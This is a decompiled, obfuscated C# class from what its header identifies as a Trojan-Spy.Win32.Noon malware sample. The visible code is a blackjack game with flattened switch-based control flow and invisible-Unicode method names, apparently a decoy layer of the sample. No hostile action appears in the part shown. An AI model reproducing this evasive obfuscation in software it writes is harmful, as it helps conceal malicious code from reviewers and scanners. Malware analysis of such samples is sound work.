// Decompiled with JetBrains decompiler
// Type: TraceFor.IManagedActivationFact
// Assembly: UInt32ArrayTypeI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2F94D963-B282-4BF6-A540-85D019D8F975
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqa-e64990765a452d35a4b5e461940d547ab3e145dbdf2e3b4b282b12ed1eba308d.exe

using ApartmentSt;
using CaseInsensitiveCompa;
using ComparisonCompa;
using ConsoleCancelEventA;
using ILegacyEvidenceAdap;
using NullableTypeI;
using ProfileOptimizat;
using SecurityPermissionAttrib;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using TOKENU;

namespace TraceFor
{
  public class IManagedActivationFact
  {
    internal fl Callback = new fl();

    public WriteToUnderlyingStreamAsync GameView { get; }

    public EvidenceCollect Game { get; }

    public IManagedActivationFact(CreateFl User)
    {
label_1:
      int num1 = -2023834664;
      ISCIIEncod Machine;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1216013258)) % 8U)
        {
          case 0:
            this.Game.Deck = this.Callback.PrepareDeck();
            num1 = (int) num2 * 2075543693 ^ -348250823;
            continue;
          case 1:
            this.Game = new EvidenceCollect(new ResourceMana(User.Id, User.Name, User.Balance, User.Winstreak, User.WinCount, User.LoseCount, User.Games, User.Owing, User.AverageBet, User.MaxBet, User.MinBet, User.LastPlay, User.CurrentStreak), Machine);
            num1 = (int) num2 * -1418123581 ^ -1911156843;
            continue;
          case 2:
            Machine = new ISCIIEncod();
            num1 = (int) num2 * -1436112592 ^ 1817929567;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_3;
          case 5:
            num1 = (int) num2 * -1367999208 ^ 826304156;
            continue;
          case 6:
            num1 = (int) num2 * -979664387 ^ 482060989;
            continue;
          case 7:
            this.GameView = new WriteToUnderlyingStreamAsync(this);
            num1 = (int) num2 * -798170534 ^ -1479498916;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    public void UpdateLogs(string newLog)
    {
label_1:
      int num1 = 780433232;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 864024218)) % 5U)
        {
          case 0:
            this.GameView.SetLogText(this.Game.Logs);
            num1 = (int) num2 * 2092598050 ^ -1966026781;
            continue;
          case 1:
            EvidenceCollect game = this.Game;
            game.Logs = IManagedActivationFact.\u206E‌⁬‮‌​​‪⁫‍‪‮⁭‎‏‍​‏‪⁪⁮‮‭‏‮⁯⁬‏‍‏⁭​‫‌‫⁬‎‫‌‪‮(game.Logs, newLog);
            num1 = (int) num2 * 1447057694 ^ 595898161;
            continue;
          case 2:
            num1 = (int) num2 * 483510877 ^ 1200939806;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public void StartGame()
    {
label_1:
      int num1 = -878812227;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -10572901)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            IManagedActivationFact.\u202C‏⁫‫‏‎⁮‬‭‌‬⁯‪⁮⁪⁫⁪‏‎‬‪⁫‌⁪⁬‌‍‎⁭‬‎‮⁮⁮‫‬⁯⁮​⁮‮((Control) this.GameView);
            num1 = (int) num2 * 533742626 ^ -490435470;
            continue;
          case 3:
            this.GameView.SetLabels(this.Game);
            num1 = (int) num2 * -1797643057 ^ 232842957;
            continue;
          case 4:
            num1 = (int) num2 * -1601420510 ^ -393331542;
            continue;
          case 5:
            this.UpdateLogs("Game started;");
            num1 = (int) num2 * 1860021638 ^ 246435523;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    ~IManagedActivationFact()
    {
    }

    public void BeginGame()
    {
label_1:
      int num1 = -1391050693;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -49637190)) % 14U)
        {
          case 0:
            num1 = (int) num2 * 47918893 ^ 758044175;
            continue;
          case 1:
            this.UpdateLogs("Deck shuffled. Wait for bet;");
            num1 = (int) num2 * -1861373032 ^ -1667397565;
            continue;
          case 2:
            num1 = (int) num2 * 1420919070 ^ -1356154325;
            continue;
          case 3:
            this.GameView.SetLabels(this.Game);
            num1 = (int) num2 * 696365365 ^ 1732093195;
            continue;
          case 4:
            num1 = (int) num2 * -997595445 ^ 2057154241;
            continue;
          case 5:
            num1 = (int) num2 * -754849898 ^ -1986447454;
            continue;
          case 6:
            goto label_3;
          case 7:
            this.Game.Deck = this.Callback.ShuffleDeck(this.Game.Deck);
            num1 = (int) num2 * -1949398245 ^ -1451131405;
            continue;
          case 8:
            this.Game.ShouldWarn = true;
            num1 = (int) num2 * 258581643 ^ -1893761013;
            continue;
          case 9:
            IManagedActivationFact.\u202C‏⁫‫‏‎⁮‬‭‌‬⁯‪⁮⁪⁫⁪‏‎‬‪⁫‌⁪⁬‌‍‎⁭‬‎‮⁮⁮‫‬⁯⁮​⁮‮((Control) new ApplicationSecurityI());
            num1 = (int) num2 * -592568644 ^ -1062212418;
            continue;
          case 10:
            num1 = (int) num2 * 2061464064 ^ -1642338048;
            continue;
          case 11:
            this.GameView.ToggleButtonsOnGameBegin();
            num1 = (int) num2 * -308451577 ^ -1895215285;
            continue;
          case 12:
            goto label_1;
          case 13:
            num1 = (int) num2 * -152658595 ^ 1327025878;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:;
    }

    public void TakeBet()
    {
label_1:
      int num1 = 152176870;
      MetadataImp metadataImp;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2096536608)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            metadataImp.TakeBet();
            num1 = (int) num2 * -967785019 ^ -2031566781;
            continue;
          case 3:
            this.UpdateLogs("Player set bet;");
            num1 = (int) num2 * 993886626 ^ 764309575;
            continue;
          case 4:
            num1 = (int) num2 * 810224967 ^ 405482151;
            continue;
          case 5:
            metadataImp = new MetadataImp(this);
            this.GameView.DisableQuit();
            num1 = (int) num2 * 1744615581 ^ -1961381381;
            continue;
          case 6:
            this.GameView.DisableBetButtons();
            num1 = (int) num2 * 1732054542 ^ 2054577084;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    public void AutoSetBetAsync()
    {
      Random random = IManagedActivationFact.\u202D‏⁭⁪⁯⁭‭‫‌‎‌⁬⁯⁭‭‭⁮‎⁮⁪‍⁯‌‫‌‬​⁫‌⁭⁯‪‍‭​‎‪‏‪⁫‮();
label_1:
      int num1 = 1772678004;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 514166077)) % 9U)
        {
          case 0:
            num1 = (int) num3 * 795539833 ^ 1667428429;
            continue;
          case 1:
            int num4 = this.Game.Player.Balance <= 0 ? -671229446 : (num4 = -1416870053);
            num1 = num4 ^ (int) num3 * -100359197;
            continue;
          case 2:
            this.Game.Player.Bet = num2;
            num1 = 510849522;
            continue;
          case 3:
            this.UpdateLogs("Player set bet auto;");
            num1 = (int) num3 * 1678463532 ^ 1783574155;
            continue;
          case 4:
            goto label_3;
          case 5:
            num2 = IManagedActivationFact.\u206C​‫‍‏‍‫‭‭‭⁭‌‬⁪⁯⁮‭‬‭⁮‍‫⁭‍‫‎‍‬‎⁬‮​‬‌‮‍‭⁮⁬‭‮(random, 100, 1001);
            num1 = 1450814563;
            continue;
          case 6:
            num2 = IManagedActivationFact.\u206C​‫‍‏‍‫‭‭‭⁭‌‬⁪⁯⁮‭‬‭⁮‍‫⁭‍‫‎‍‬‎⁬‮​‬‌‮‍‭⁮⁬‭‮(random, (int) ((double) this.Game.Player.Balance * 0.05), (int) ((double) this.Game.Player.Balance * 0.25));
            num1 = (int) num3 * 332109956 ^ -1700621985;
            continue;
          case 7:
            num2 = 0;
            num1 = (int) num3 * -1623773950 ^ -256899012;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    public void ContinueGameAsync(bool context)
    {
label_1:
      int num1 = -721127193;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1430621332)) % 20U)
        {
          case 0:
            this.GameView.SetLabels(this.Game);
            num1 = (int) num2 * -1490293152 ^ 533925159;
            continue;
          case 1:
            num1 = (int) num2 * -1824101254 ^ -1620867627;
            continue;
          case 2:
            flag = context;
            num1 = (int) num2 * -1485030538 ^ 1869980742;
            continue;
          case 3:
            this.GameView.EnableHitAndDoubleButtons();
            num1 = (int) num2 * -102723849 ^ 1816111263;
            continue;
          case 4:
            ++this.Game.TurnWho;
            num1 = (int) num2 * -581655276 ^ -1264718500;
            continue;
          case 5:
            num1 = (int) num2 * -76489942 ^ 629854974;
            continue;
          case 6:
            this.GameView.ToogleGameButtonsState(this.Game);
            num1 = (int) num2 * 627711090 ^ -761991607;
            continue;
          case 7:
            this.GameView.EnableQuit();
            num1 = (int) num2 * 1546098513 ^ -1075139752;
            continue;
          case 8:
            goto label_3;
          case 9:
            this.UpdateLogs("Deal cards 1 hand. Turn: Player;");
            num1 = (int) num2 * -252502250 ^ 1710554507;
            continue;
          case 10:
            num1 = (int) num2 * -1182622731 ^ 788720726;
            continue;
          case 11:
            num1 = (int) num2 * -1706798319 ^ -1006107421;
            continue;
          case 12:
            this.GameView.DisableBetButtons();
            num1 = (int) num2 * 1395932703 ^ 1553462930;
            continue;
          case 13:
            goto label_1;
          case 14:
            int num3 = !flag ? -1479311599 : (num3 = -1304146729);
            num1 = num3 ^ (int) num2 * -350727798;
            continue;
          case 15:
            this.GameView.EnableSurrender();
            num1 = (int) num2 * -507621847 ^ 79121939;
            continue;
          case 16:
            this.SetMachineBet();
            num1 = (int) num2 * -1299299999 ^ -1055603071;
            continue;
          case 17:
            this.GameView.EnableBetButtons();
            num1 = -1737288490;
            continue;
          case 18:
            num1 = (int) num2 * -196591194 ^ -2083651160;
            continue;
          case 19:
            num1 = (int) num2 * 1807402618 ^ 2093652856;
            continue;
          default:
            goto label_22;
        }
      }
label_3:
      return;
label_22:;
    }

    private void SetMachineBet()
    {
label_1:
      int num1 = 2136531077;
      int num2;
      double num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (num1 ^ 625453481)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Game.Machine.Bet = num2;
            num1 = (int) num4 * 505575510 ^ 250794574;
            continue;
          case 2:
            num2 = (int) ((double) this.Game.Player.Bet * (1.0 + num3));
            num1 = (int) num4 * -1588099737 ^ 2077801845;
            continue;
          case 3:
            num3 = HostProtectionAttrib.RandDoubleInRange(-0.15, 0.15);
            num1 = (int) num4 * -1457382407 ^ -435214583;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      this.UpdateLogs("House set bet.;");
    }

    public void ControlButtonsClick(string ClickedButton)
    {
label_1:
      int num1 = 1126130282;
      string str;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1856572323)) % 36U)
        {
          case 0:
            int num3 = !IManagedActivationFact.\u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮(str, "DoubleButton") ? -1268919301 : (num3 = -636386758);
            num1 = num3 ^ (int) num2 * -929892621;
            continue;
          case 1:
            num1 = (int) num2 * 1279082370 ^ 836168755;
            continue;
          case 2:
            int num4 = !IManagedActivationFact.\u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮(str, "FlipButton") ? 1320670008 : (num4 = 2036643477);
            num1 = num4 ^ (int) num2 * -2129952698;
            continue;
          case 3:
            this.UpdateLogs("Player stand. Turn: House;");
            num1 = 1121508003;
            continue;
          case 4:
            num1 = (int) num2 * -1500431936 ^ 696393801;
            continue;
          case 5:
            str = ClickedButton;
            num1 = (int) num2 * -1335818250 ^ 63869274;
            continue;
          case 6:
            this.UpdateLogs("Player flip hand(s);");
            num1 = 1779353400;
            continue;
          case 7:
            this.Callback.DoubleBetThenFlipHands(this);
            num1 = (int) num2 * -1324786660 ^ 213140185;
            continue;
          case 8:
            int num5 = !IManagedActivationFact.\u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮(str, "SplitButton") ? -504414831 : (num5 = -1123881256);
            num1 = num5 ^ (int) num2 * 1556782410;
            continue;
          case 9:
            num1 = (int) num2 * -2085368327 ^ 418145037;
            continue;
          case 10:
            this.Callback.PassPlayerTurn(this);
            num1 = (int) num2 * -1672314981 ^ 1332893485;
            continue;
          case 11:
            this.Callback.FlipPlayerHands(this);
            num1 = (int) num2 * -1823107081 ^ 2020916750;
            continue;
          case 12:
            goto label_1;
          case 13:
            num1 = (int) num2 * 794844723 ^ 1616437926;
            continue;
          case 14:
            num1 = (int) num2 * 1830320480 ^ -579134540;
            continue;
          case 15:
            this.Callback.AllowDraw1Card(this);
            num1 = (int) num2 * -413575377 ^ -1894180410;
            continue;
          case 16:
            num1 = (int) num2 * -186107104 ^ 1989698249;
            continue;
          case 17:
            int num6 = !flag ? -937272204 : (num6 = -2130928672);
            num1 = num6 ^ (int) num2 * 960522750;
            continue;
          case 18:
            num1 = (int) num2 * 455140907 ^ -718168349;
            continue;
          case 19:
            num1 = (int) num2 * 1938445484 ^ -1017265970;
            continue;
          case 20:
            int num7 = !IManagedActivationFact.\u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮(str, "HitButton") ? 184399799 : (num7 = 453579368);
            num1 = num7 ^ (int) num2 * 147395711;
            continue;
          case 21:
            this.UpdateLogs("Player double bet;");
            num1 = 345743389;
            continue;
          case 22:
            this.Callback.SplitPlayerHandThenDraw(this);
            num1 = (int) num2 * -426312480 ^ -1638643216;
            continue;
          case 23:
            this.UpdateLogs("Player split hand;");
            num1 = 344415829;
            continue;
          case 24:
            num1 = (int) num2 * -74927161 ^ 1220479977;
            continue;
          case 25:
            this.Game.Winner = "Machine";
            num1 = 1856236769;
            continue;
          case 26:
            flag = IManagedActivationFact.\u200E⁪‮‫‌‬‬​⁬⁮‪⁪‍​⁪‫‏‭⁮‬⁪‍‪‫‬‪​‎​‍⁮⁫⁮‌‍⁭‪‮⁯‍‮(this.Game.Winner, string.Empty);
            num1 = 352423782;
            continue;
          case 27:
            int num8 = !IManagedActivationFact.\u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮(str, "StandButton") ? -1324888541 : (num8 = -2017250060);
            num1 = num8 ^ (int) num2 * -1380306068;
            continue;
          case 28:
            num1 = (int) num2 * -1881270497 ^ 2080577086;
            continue;
          case 29:
            this.Callback.CalculateBalance(this.Game);
            num1 = (int) num2 * -99104453 ^ 625958584;
            continue;
          case 30:
            num1 = (int) num2 * -1064341683 ^ -1358411677;
            continue;
          case 31:
            num1 = (int) num2 * -1050978834 ^ 148204251;
            continue;
          case 32:
            num1 = (int) num2 * -475290283 ^ -1790293346;
            continue;
          case 33:
            goto label_3;
          case 34:
            num1 = (int) num2 * 683155088 ^ -1561329962;
            continue;
          case 35:
            this.UpdateLogs("Player hit card;");
            num1 = 655686330;
            continue;
          default:
            goto label_38;
        }
      }
label_3:
      return;
label_38:;
    }

    static string \u206E‌⁬‮‌​​‪⁫‍‪‮⁭‎‏‍​‏‪⁪⁮‮‭‏‮⁯⁬‏‍‏⁭​‫‌‫⁬‎‫‌‪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static void \u202C‏⁫‫‏‎⁮‬‭‌‬⁯‪⁮⁪⁫⁪‏‎‬‪⁫‌⁪⁬‌‍‎⁭‬‎‮⁮⁮‫‬⁯⁮​⁮‮([In] Control obj0) => obj0.Show();

    static Random \u202D‏⁭⁪⁯⁭‭‫‌‎‌⁬⁯⁭‭‭⁮‎⁮⁪‍⁯‌‫‌‬​⁫‌⁭⁯‪‍‭​‎‪‏‪⁫‮() => new Random();

    static int \u206C​‫‍‏‍‫‭‭‭⁭‌‬⁪⁯⁮‭‬‭⁮‍‫⁭‍‫‎‍‬‎⁬‮​‬‌‮‍‭⁮⁬‭‮([In] Random obj0, [In] int obj1, [In] int obj2) => obj0.Next(obj1, obj2);

    static bool \u206B‌​‍‭‏⁬⁬‫‎⁮‮⁯⁬‮⁮⁫‬‬‮‮‫⁯⁪⁪‍‬⁬⁯‬⁭​‎⁬‭⁫​⁭‮⁯‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static bool \u200E⁪‮‫‌‬‬​⁬⁮‪⁪‍​⁪‫‏‭⁮‬⁪‍‪‫‬‪​‎​‍⁮⁫⁮‌‍⁭‪‮⁯‍‮([In] string obj0, [In] string obj1) => obj0 != obj1;
  }
}
